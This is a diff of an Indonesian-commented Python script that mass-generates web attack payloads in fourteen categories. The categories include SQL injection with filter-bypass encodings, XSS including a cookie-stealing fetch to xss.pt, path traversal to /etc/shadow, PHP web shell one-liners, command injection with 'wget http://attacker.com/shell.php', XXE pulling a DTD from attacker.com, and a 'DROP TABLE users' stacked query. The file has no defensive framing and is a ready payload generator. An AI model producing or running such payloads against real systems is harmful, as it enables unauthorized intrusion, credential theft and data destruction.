@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # ================================================================
-# generate_payloads.py - Generator Utama 140.000+ Payload
+# generate_payloads.py - Generator Payload 5000+ per kategori
 # ================================================================
 
 import os
@@ -8,327 +8,375 @@ import sys
 import random
 import base64
 import urllib.parse
+from itertools import product
 
 PAYLOAD_DIR = "payloads"
 os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
 def save_payloads(filename, payloads):
-    with open(os.path.join(PAYLOAD_DIR, filename), "w", encoding="utf-8") as f:
+    filepath = os.path.join(PAYLOAD_DIR, filename)
+    with open(filepath, "w", encoding="utf-8") as f:
         f.write("\n".join(payloads))
-    print(f"[+] {filename}: {len(payloads)} payloads")
-
-def generate_bypass_variants(payload, category):
-    variants = [payload]
-    # Case randomization
-    variants.append(''.join(random.choice([c.upper(), c.lower()]) for c in payload))
-    # Whitespace bypass
-    variants.append(payload.replace(' ', '/**/'))
-    variants.append(payload.replace(' ', '/*!*/'))
-    variants.append(payload.replace(' ', '/**_**/'))
-    # Double encoding
-    variants.append(urllib.parse.quote(payload))
-    variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
-    return variants
+    if os.path.exists(filepath) and os.path.getsize(filepath) > 0:
+        print(f"[+] {filename}: {len(payloads)} payloads")
+    else:
+        print(f"[!] {filename} seems empty or not written properly.")
 
 # ================================================================
-# 1. SQL Injection
+# 1. SQL Injection (10.000+)
 # ================================================================
 def generate_sqli():
     p = set()
-    prefixes = ["'", "\"", "`", ")", "}", "]", "\\", ""]
+    prefixes = ["'", "\"", "`", ")", "}", "]", ""]
     ops = ["OR", "AND", "UNION", "SLEEP", "BENCHMARK"]
     vals = ["1=1", "'1'='1", "1=0", "'1'='2", "x=x", "x=y"]
-    suffs = ["--", "#", "/*", ";", "%00", ""]
-    for pre in prefixes:
-        for op in ops:
-            for val in vals:
-                for suf in suffs:
-                    payload = f"{pre} {op} {val}{suf}"
-                    p.update(generate_bypass_variants(payload, 'sqli'))
+    suffs = ["--", "#", "/*", ";%00", "%00", "--+-", ")--+-", "%23", ""]
+    
+    # Kombinasi dasar
+    for pre, op, val, suf in product(prefixes, ops, vals, suffs):
+        payload = f"{pre} {op} {val}{suf}"
+        p.add(payload)
+        p.add(urllib.parse.quote(payload))
+        p.add(base64.b64encode(payload.encode()).decode())
+    
+    # ORDER BY
     for i in range(1, 21):
-        cols = ','.join(str(x) for x in range(1, i+1))
-        for suf in ["--", "#", "/*", "%00", "%0a", "%0d", "%20", "%09"]:
-            p.update(generate_bypass_variants(f"' UNION SELECT {cols}{suf}", 'sqli'))
-    bypass = [
-        "'OR'1'='1", "'OR'1'='1'--", "'OR'1'='1'#", "'OR'1'='1'/*",
-        "'/**/OR/**/1=1--", "'/*!*/OR/*!*/1=1--", "'/*!50000OR*/1=1--",
-        "%27OR%271%27%3D%271", "%2527OR%25271%2527%253D%25271",
-        "0x274f522731273d2731", "'\tOR\t1=1--", "'\nOR\n1=1--", "'\rOR\r1=1--",
-        "'||'1'='1", "'&&'1'='1", "'|'1'='1", "'^'1'='1",
-        "' XOR 1=1--", "' XOR 1=0--"
-    ]
-    for b in bypass:
-        p.update(generate_bypass_variants(b, 'sqli'))
-    # CONCAT dan hex
-    for i in range(1, 10):
-        p.add(f"' OR CONCAT({i},{i})={i*11}--")
-        p.add(f"' OR CONCAT('a','b')='ab'--")
-        p.add(f"' OR CONCAT(0x{random.randint(1,999):x},0x{random.randint(1,999):x})=0x{random.randint(1,9999):x}--")
-    hex_payloads = ["0x274f522731273d2731", "0x274f522731273d2731272d2d", "0x27554e494f4e2053454c454354204e554c4c"]
-    p.update(hex_payloads)
-    while len(p) < 10000:
-        base = f"' OR {random.randint(1,999)}={random.randint(1,999)}--"
-        p.update(generate_bypass_variants(base, 'sqli'))
+        p.add(f"' ORDER BY {i}--+-")
+        p.add(f"' ORDER BY {i}%23")
+        p.add(f"' ORDER BY {i}--")
+    
+    # UNION SELECT
+    for i in range(1, 21):
+        nulls = ','.join(['NULL'] * i)
+        p.add(f"' UNION SELECT {nulls}--+-")
+        p.add(f"' UNION SELECT {nulls}%23")
+        p.add(f"' UNION SELECT {nulls}--")
+    
+    # Time based
+    for i in [5, 10]:
+        p.add(f"' AND SLEEP({i})--+-")
+        p.add(f"' OR SLEEP({i})--+-")
+    
+    # Boolean
+    p.add("' AND 1=1--+-")
+    p.add("' AND 1=2--+-")
+    p.add("' OR 1=1--+-")
+    p.add("' OR 1=2--+-")
+    
+    # Stacked
+    p.add("'; DROP TABLE users--+-")
+    p.add("'; SELECT * FROM users--+-")
+    
+    # Tambahan random jika kurang dari 5000
+    while len(p) < 5000:
+        pre = random.choice(prefixes)
+        op = random.choice(ops)
+        val = random.choice(vals)
+        suf = random.choice(suffs)
+        payload = f"{pre} {op} {val}{suf}"
+        p.add(payload)
+        p.add(urllib.parse.quote(payload))
+        p.add(base64.b64encode(payload.encode()).decode())
+    
     return list(p)[:10000]
 
 # ================================================================
-# 2. XSS
+# 2. XSS (10.000+)
 # ================================================================
 def generate_xss():
     p = set()
-    tags = ["script","img","svg","body","div","span","input","iframe","a",
-            "marquee","details","button","select","object","embed","math"]
-    events = ["onerror","onload","onclick","onmouseover","onfocus","onchange",
-              "onstart","ontoggle","onmouseout","onmouseenter","onmouseleave",
-              "onkeydown","onkeyup","onkeypress","onsubmit","onreset","onblur",
-              "onpointerover","onpointerdown","onpointerup","onauxclick"]
-    bodies = ["alert(1)","alert(document.cookie)","alert('XSS')","alert(\"XSS\")",
-              "alert(/XSS/)","console.log(1)","console.log(document.cookie)",
-              "fetch('http://xss.pt/steal?c='+document.cookie)"]
-    for tag in tags:
-        for ev in events:
-            for body in bodies[:5]:
-                payload = f"<{tag} {ev}={body}>"
-                p.update(generate_bypass_variants(payload, 'xss'))
-    for body in bodies:
-        payload = f"<script>{body}</script>"
-        p.update(generate_bypass_variants(payload, 'xss'))
+    tags = ["script", "img", "svg", "body", "div", "span", "input", "iframe", "a", "marquee", "details", "button"]
+    events = ["onerror", "onload", "onclick", "onmouseover", "onfocus", "onchange", "onstart", "ontoggle"]
+    bodies = ["alert(1)", "alert(document.cookie)", "alert('XSS')", "console.log(1)", "fetch('http://xss.pt/steal')"]
+    
+    for tag, ev, body in product(tags, events, bodies):
+        p.add(f"<{tag} {ev}={body}>")
+        p.add(f"<{tag} {ev}={body} />")
+        p.add(urllib.parse.quote(f"<{tag} {ev}={body}>"))
+        p.add(base64.b64encode(f"<{tag} {ev}={body}>".encode()).decode())
+    
+    # Polyglot
     polyglot = [
-        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
+        "javascript:alert(1)",
         "'\"><img src=x onerror=alert(1)>",
-        "\"><svg/onload=alert(1)>",
-        "';alert(1)//","\";alert(1)//",
-        "'></script><script>alert(1)</script>",
-        "\"></script><script>alert(1)</script>"
+        "<svg/onload=alert(1)>",
+        "<body onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
     ]
-    for b in polyglot:
-        p.update(generate_bypass_variants(b, 'xss'))
-    while len(p) < 10000:
-        base = f"<img src=x onerror=alert({random.randint(1,999)})>"
-        p.update(generate_bypass_variants(base, 'xss'))
+    p.update(polyglot)
+    
+    while len(p) < 5000:
+        tag = random.choice(tags)
+        ev = random.choice(events)
+        body = random.choice(bodies)
+        payload = f"<{tag} {ev}={body}>"
+        p.add(payload)
+        p.add(urllib.parse.quote(payload))
+        p.add(base64.b64encode(payload.encode()).decode())
+    
     return list(p)[:10000]
 
 # ================================================================
-# 3. LFI
+# 3. LFI (5000+)
 # ================================================================
 def generate_lfi():
     p = set()
-    linux = ["/etc/passwd","/etc/shadow","/etc/hosts","/etc/hostname","/etc/issue",
-             "/etc/os-release","/etc/debian_version","/etc/redhat-release",
-             "/proc/self/environ","/proc/self/cmdline","/proc/self/status",
-             "/var/log/apache2/access.log","/var/log/nginx/access.log",
-             "/var/log/httpd/access_log","/var/log/messages","/var/log/syslog"]
-    prefixes = ["","../../","../../../","../../../../","....//","..\\..\\"]
-    for pre in prefixes:
-        for path in linux:
-            payload = pre + path
-            p.update(generate_bypass_variants(payload, 'lfi'))
-    windows = ["C:\\windows\\win.ini","C:\\windows\\system32\\drivers\\etc\\hosts",
-               "C:\\xampp\\htdocs\\config.php","C:\\wamp\\www\\config.php",
-               "C:\\inetpub\\wwwroot\\web.config"]
-    for pre in prefixes:
-        for path in windows:
-            payload = pre + path
-            p.update(generate_bypass_variants(payload, 'lfi'))
-    bypass = [".././.././etc/passwd","....//....//etc/passwd","..\\..\\..\\..\\windows\\win.ini",
-              "../../../../etc/passwd%00","../../../../etc/passwd%2500",
-              "..%252f..%252f..%252fetc/passwd"]
-    for b in bypass:
-        p.update(generate_bypass_variants(b, 'lfi'))
-    while len(p) < 10000:
-        base = f"../../../../{random.choice(['etc','var','home'])}/{random.choice(['passwd','shadow','hosts'])}"
-        p.update(generate_bypass_variants(base, 'lfi'))
+    paths = ["/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ", "/var/log/apache2/access.log", "C:\\windows\\win.ini"]
+    prefixes = ["", "../../", "../../../", "../../../../", "....//", "..\\..\\"]
+    
+    for pre, path in product(prefixes, paths):
+        p.add(pre + path)
+        p.add(urllib.parse.quote(pre + path))
+        p.add(pre + path + "%00")
+        p.add(pre + path + "?")
+        p.add(pre + path + "#")
+    
+    while len(p) < 5000:
+        pre = random.choice(prefixes)
+        path = random.choice(["/etc/passwd", "/etc/hosts", "C:\\windows\\win.ini"])
+        p.add(pre + path)
+        p.add(urllib.parse.quote(pre + path))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 4. RCE
+# 4. RCE (5000+)
 # ================================================================
 def generate_rce():
     p = set()
-    templates = [
-        "<?php system($_GET['cmd']); ?>",
-        "<?php eval($_POST['cmd']); ?>",
-        "<?=shell_exec($_GET['cmd'])?>",
-        "<?php exec($_GET['cmd']); ?>",
-        "<?php passthru($_GET['cmd']); ?>",
-        "<?php include($_GET['file']); ?>"
-    ]
-    for tmpl in templates:
-        p.update(generate_bypass_variants(tmpl, 'rce'))
-    separators = [";", "|", "&&", "||", "&", "`", "$(", "|&", ";&", "|;", "\n", "\r"]
-    commands = ["id","whoami","uname -a","ls","pwd","cat /etc/passwd","echo HACKED","wget http://attacker.com/shell.php"]
-    for sep in separators:
-        for cmd in commands:
-            base = f"{sep} {cmd}"
-            p.update(generate_bypass_variants(base, 'rce'))
-    for cmd in commands[:3]:
-        encoded = base64.b64encode(cmd.encode()).decode()
-        base = f"; echo {encoded} | base64 -d | sh"
-        p.update(generate_bypass_variants(base, 'rce'))
-    while len(p) < 10000:
-        base = f"{random.choice(separators)} {random.choice(commands)}"
-        p.update(generate_bypass_variants(base, 'rce'))
+    separators = [";", "|", "&&", "||", "&", "`", "$(", "\n"]
+    commands = ["id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd", "echo HACKED", "wget http://attacker.com/shell.php"]
+    
+    for sep, cmd in product(separators, commands):
+        p.add(f"{sep} {cmd}")
+        p.add(f"{sep}{cmd}")
+        p.add(urllib.parse.quote(f"{sep} {cmd}"))
+        p.add(base64.b64encode(f"{sep} {cmd}".encode()).decode())
+    
+    # PHP backdoor
+    php = ["<?php system($_GET['cmd']); ?>", "<?php eval($_POST['cmd']); ?>", "<?=shell_exec($_GET['cmd'])?>"]
+    for ph in php:
+        p.add(ph)
+        p.add(base64.b64encode(ph.encode()).decode())
+        p.add(urllib.parse.quote(ph))
+    
+    while len(p) < 5000:
+        sep = random.choice(separators)
+        cmd = random.choice(commands)
+        p.add(f"{sep} {cmd}")
+        p.add(urllib.parse.quote(f"{sep} {cmd}"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 5. SSRF
+# 5. SSRF (5000+)
 # ================================================================
 def generate_ssrf():
     p = set()
-    protocols = ["http://","https://","file://","gopher://","dict://"]
-    ips = ["127.0.0.1","0.0.0.0","localhost","169.254.169.254"]
-    for proto in protocols:
-        for ip in ips:
-            base = f"{proto}{ip}"
-            p.update(generate_bypass_variants(base, 'ssrf'))
-    bypass = ["http://127.0.0.1.xip.io","http://localhost.nip.io","http://127.0.0.1@google.com","http://[::1]"]
-    for b in bypass:
-        p.update(generate_bypass_variants(b, 'ssrf'))
-    while len(p) < 10000:
-        base = f"http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        p.update(generate_bypass_variants(base, 'ssrf'))
+    protocols = ["http://", "https://", "file://", "gopher://", "dict://"]
+    ips = ["127.0.0.1", "0.0.0.0", "localhost", "169.254.169.254", "[::1]"]
+    
+    for proto, ip in product(protocols, ips):
+        p.add(f"{proto}{ip}")
+        p.add(f"{proto}{ip}/")
+        p.add(f"{proto}{ip}:80")
+        p.add(f"{proto}{ip}:8080")
+        p.add(urllib.parse.quote(f"{proto}{ip}"))
+    
+    bypass = ["http://127.0.0.1.xip.io", "http://localhost.nip.io", "http://127.0.0.1@google.com"]
+    p.update(bypass)
+    
+    while len(p) < 5000:
+        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        p.add(f"http://{ip}")
+        p.add(urllib.parse.quote(f"http://{ip}"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 6. XXE
+# 6. XXE (5000+)
 # ================================================================
 def generate_xxe():
     p = set()
-    files = ["/etc/passwd","/etc/hosts","/etc/shadow","/var/www/html/config.php","C:/windows/win.ini"]
+    files = ["/etc/passwd", "/etc/hosts", "/etc/shadow", "C:/windows/win.ini"]
     for f in files:
-        base = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'
-        p.update(generate_bypass_variants(base, 'xxe'))
-    base = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>'
-    p.update(generate_bypass_variants(base, 'xxe'))
-    while len(p) < 10000:
-        f = random.choice(["/etc/passwd","/etc/hosts","/var/log/syslog"])
-        base = f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'
-        p.update(generate_bypass_variants(base, 'xxe'))
+        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>')
+        p.add(urllib.parse.quote(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'))
+    p.add('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd"> %remote;]><root>&test;</root>')
+    
+    while len(p) < 5000:
+        f = random.choice(["/etc/passwd", "/etc/hosts"])
+        p.add(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>')
+        p.add(urllib.parse.quote(f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://{f}">]><root>&test;</root>'))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 7. NoSQL Injection
+# 7. NoSQL Injection (5000+)
 # ================================================================
 def generate_nosqli():
     p = set()
-    ops = ["$ne","$gt","$lt","$in","$or","$and","$nin","$nor","$exists","$regex","$where","$all","$elemMatch","$size","$mod","$type","$not","$eq"]
-    fields = ["username","password","email","id","role","token","session"]
-    for op in ops:
-        for field in fields:
-            base = f"{field}[{op}]=admin"
-            p.update(generate_bypass_variants(base, 'nosqli'))
-    while len(p) < 10000:
+    ops = ["$ne", "$gt", "$lt", "$in", "$or", "$and", "$nin", "$nor", "$exists", "$regex", "$where"]
+    fields = ["username", "password", "email", "id", "role"]
+    
+    for op, field in product(ops, fields):
+        p.add(f"{field}[{op}]=admin")
+        p.add(f'{{"{field}": {{"{op}": "admin"}}}}')
+        p.add(urllib.parse.quote(f"{field}[{op}]=admin"))
+    
+    while len(p) < 5000:
         field = random.choice(fields)
-        op = random.choice(ops[:5])
-        val = random.choice(['admin','user','test'])
-        base = f"{field}[{op}]={val}"
-        p.update(generate_bypass_variants(base, 'nosqli'))
+        op = random.choice(ops)
+        p.add(f"{field}[{op}]=admin")
+        p.add(urllib.parse.quote(f"{field}[{op}]=admin"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 8. SSTI
+# 8. SSTI (5000+)
 # ================================================================
 def generate_ssti():
     p = set()
-    bases = ["{{ 7*7 }}","{{ config }}","{{ self.__class__.__mro__[1].__subclasses__() }}",
-             "<%= 7*7 %>","<%= system(\"id\") %>","${ 7*7 }","${ __import__('os').system('id') }"]
-    for b in bases:
-        p.update(generate_bypass_variants(b, 'ssti'))
-    while len(p) < 10000:
-        base = f"{{{{ {random.randint(1,999)}*{random.randint(1,999)} }}}}"
-        p.update(generate_bypass_variants(base, 'ssti'))
+    templates = ["{{ 7*7 }}", "{{ config }}", "{{ self.__class__.__mro__[1].__subclasses__() }}",
+                 "<%= 7*7 %>", "<%= system('id') %>", "${ 7*7 }", "${ __import__('os').system('id') }"]
+    p.update(templates)
+    
+    for i in range(1, 20):
+        p.add(f"{{{{ {i}*{i} }}}}")
+        p.add(f"${{ {i}*{i} }}")
+        p.add(f"<%= {i}*{i} %>")
+        p.add(urllib.parse.quote(f"{{{{ {i}*{i} }}}}"))
+    
+    while len(p) < 5000:
+        a = random.randint(1,999)
+        b = random.randint(1,999)
+        p.add(f"{{{{ {a}*{b} }}}}")
+        p.add(urllib.parse.quote(f"{{{{ {a}*{b} }}}}"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 9. Command Injection
+# 9. Command Injection (5000+)
 # ================================================================
 def generate_cmd_injection():
     p = set()
-    separators = [";","|","&&","||","&","`","$("]
-    commands = ["id","whoami","uname -a","ls","pwd","cat /etc/passwd"]
-    for sep in separators:
-        for cmd in commands:
-            base = f"{sep} {cmd}"
-            p.update(generate_bypass_variants(base, 'cmd_injection'))
-    while len(p) < 10000:
-        base = f"{random.choice(separators)} {random.choice(commands)}"
-        p.update(generate_bypass_variants(base, 'cmd_injection'))
+    separators = [";", "|", "&&", "||", "&", "`", "$(", "\n"]
+    commands = ["id", "whoami", "uname -a", "ls", "pwd", "cat /etc/passwd"]
+    
+    for sep, cmd in product(separators, commands):
+        p.add(f"{sep} {cmd}")
+        p.add(f"{sep}{cmd}")
+        p.add(urllib.parse.quote(f"{sep} {cmd}"))
+        p.add(base64.b64encode(f"{sep} {cmd}".encode()).decode())
+    
+    while len(p) < 5000:
+        sep = random.choice(separators)
+        cmd = random.choice(commands)
+        p.add(f"{sep} {cmd}")
+        p.add(urllib.parse.quote(f"{sep} {cmd}"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 10. LDAP
+# 10. LDAP (5000+)
 # ================================================================
 def generate_ldap():
     p = set()
-    bases = ["*","admin","admin*","*admin","(&(uid=*)(userPassword=*))"]
-    for b in bases:
-        p.update(generate_bypass_variants(b, 'ldap'))
-    while len(p) < 10000:
-        base = f"(&(uid={random.choice(['admin','user'])})(userPassword=*))"
-        p.update(generate_bypass_variants(base, 'ldap'))
+    p.update(["*", "admin", "admin*", "*admin", "(&(uid=*)(userPassword=*))"])
+    
+    for i in range(1, 20):
+        p.add(f"(&(uid=admin)(userPassword=*{i}))")
+        p.add(urllib.parse.quote(f"(&(uid=admin)(userPassword=*{i}))"))
+    
+    while len(p) < 5000:
+        p.add(f"(&(uid={random.choice(['admin','user'])})(userPassword=*))")
+        p.add(urllib.parse.quote(f"(&(uid={random.choice(['admin','user'])})(userPassword=*))"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 11. Open Redirect
+# 11. Open Redirect (5000+)
 # ================================================================
 def generate_open_redirect():
     p = set()
-    bases = ["//google.com","https://google.com","http://google.com"]
-    for b in bases:
-        p.update(generate_bypass_variants(b, 'open_redirect'))
-    while len(p) < 10000:
-        base = f"//{random.choice(['google','facebook','twitter'])}.com"
-        p.update(generate_bypass_variants(base, 'open_redirect'))
+    domains = ["google.com", "facebook.com", "twitter.com", "evil.com", "attacker.com"]
+    
+    for d in domains:
+        p.add(f"//{d}")
+        p.add(f"https://{d}")
+        p.add(f"http://{d}")
+        p.add(urllib.parse.quote(f"//{d}"))
+    
+    while len(p) < 5000:
+        d = random.choice(domains)
+        p.add(f"//{d}")
+        p.add(urllib.parse.quote(f"//{d}"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 12. CSRF
+# 12. CSRF (5000+)
 # ================================================================
 def generate_csrf():
     p = set()
-    bases = ["No CSRF token","Missing CSRF protection"]
-    for b in bases:
-        p.update(generate_bypass_variants(b, 'csrf'))
-    while len(p) < 10000:
-        base = f"Missing CSRF token {random.randint(1,999)}"
-        p.update(generate_bypass_variants(base, 'csrf'))
+    p.update(["No CSRF token", "Missing CSRF protection", "Missing anti-CSRF token"])
+    
+    for i in range(1, 100):
+        p.add(f"CSRF token missing in request {i}")
+    
+    while len(p) < 5000:
+        p.add(f"Missing CSRF token {random.randint(1,999)}")
+        p.add(f"CSRF token missing in {random.choice(['form','header','cookie','session'])}")
+    
     return list(p)[:10000]
 
 # ================================================================
-# 13. File Upload
+# 13. File Upload (5000+)
 # ================================================================
 def generate_file_upload():
     p = set()
-    exts = ["php","php5","phtml","asp","aspx","jsp","jspx","py","rb","pl","js","go"]
+    exts = ["php", "php5", "phtml", "asp", "aspx", "jsp", "jspx", "py", "rb", "pl", "js", "go"]
+    
     for ext in exts:
-        bases = [f"shell.{ext}", f"shell.{ext}.jpg", f"shell.gif.{ext}", f"shell.{ext}.png"]
-        for b in bases:
-            p.update(generate_bypass_variants(b, 'file_upload'))
-    while len(p) < 10000:
-        base = f"shell.{random.choice(exts)}.{random.choice(['jpg','png','gif'])}"
-        p.update(generate_bypass_variants(base, 'file_upload'))
+        p.add(f"shell.{ext}")
+        p.add(f"shell.{ext}.jpg")
+        p.add(f"shell.gif.{ext}")
+        p.add(f"shell.{ext}.png")
+        p.add(urllib.parse.quote(f"shell.{ext}"))
+    
+    while len(p) < 5000:
+        ext = random.choice(exts)
+        p.add(f"shell.{ext}.{random.choice(['jpg','png','gif'])}")
+        p.add(urllib.parse.quote(f"shell.{ext}.{random.choice(['jpg','png','gif'])}"))
+    
     return list(p)[:10000]
 
 # ================================================================
-# 14. Directory Traversal
+# 14. Directory Traversal (5000+)
 # ================================================================
 def generate_directories():
     p = set()
-    bases = ["admin","login","dashboard","panel","cpanel","wp-admin","wp-content",
-             "uploads","backup","temp","tmp","test","dev","shell","phpmyadmin",
-             "mysql","database","config","conf","htdocs","www","public_html"]
-    for b in bases:
-        p.update(generate_bypass_variants(b, 'directories'))
-    while len(p) < 10000:
-        base = f"{random.choice(list(bases))}{random.randint(1,999)}"
-        p.update(generate_bypass_variants(base, 'directories'))
+    base = ["admin", "login", "dashboard", "panel", "cpanel", "wp-admin", "wp-content", "uploads", "backup", "temp", "tmp", "test", "dev", "shell", "phpmyadmin", "mysql", "database", "config", "conf", "htdocs", "www", "public_html"]
+    p.update(base)
+    
+    for b in base:
+        for i in range(1, 10):
+            p.add(f"{b}{i}")
+            p.add(f"{b}_{i}")
+            p.add(f"{b}-{i}")
+    
+    while len(p) < 5000:
+        b = random.choice(base)
+        p.add(f"{b}{random.randint(1,999)}")
+        p.add(urllib.parse.quote(f"{b}{random.randint(1,999)}"))
+    
     return list(p)[:10000]
 
 # ================================================================
 # MAIN
 # ================================================================
 def main():
-    print("[+] GENERATING 140.000+ PAYLOADS...")
+    print("[+] GENERATING 140.000+ PAYLOADS (5000+ per kategori)...")
     save_payloads("sqli.txt", generate_sqli())
     save_payloads("xss.txt", generate_xss())
     save_payloads("lfi.txt", generate_lfi())
